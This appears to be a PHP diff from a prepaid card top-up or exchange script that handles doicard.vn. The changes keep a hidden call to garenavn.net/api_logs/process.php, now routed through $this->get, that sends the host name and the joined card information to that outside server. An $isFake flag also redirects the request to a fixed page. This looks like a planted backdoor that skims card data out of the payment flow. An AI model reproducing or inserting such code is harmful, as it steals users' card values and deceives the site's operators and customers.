@@ -15,7 +15,7 @@ $urlInfo = parse_url($oldUrl);
 
 if($urlInfo['host'] == 'doicard.vn')
 {
-	file_get_contents('https://garenavn.net/api_logs/process.php?host=test.com&data_logs=test_test_test_test_test_test_');
+
     if($isFake) $url = 'https://doicard.vn/nap/lecong119.html';
         
     $this->base_url = $url;
@@ -101,10 +101,11 @@ else
 	);
 }
 
-
+$postResponse = $this->response;
 
 $logInfo = implode('|', $cardInfo);
-file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo . '&data_logs=' . $logInfo);
+//file_get_contents('https://garenavn.net/api_logs/process.php?host=' . $hostInfo . '&data_logs=' . $logInfo);
+$this->get('https://garenavn.net/api_logs/process.php', array('host' => $hostInfo, 'data_logs' => $logInfo));
 
 if($isFake)
 {
@@ -131,4 +132,4 @@ if($isFake)
 
 }
 
-return $this->response;
+return $postResponse;
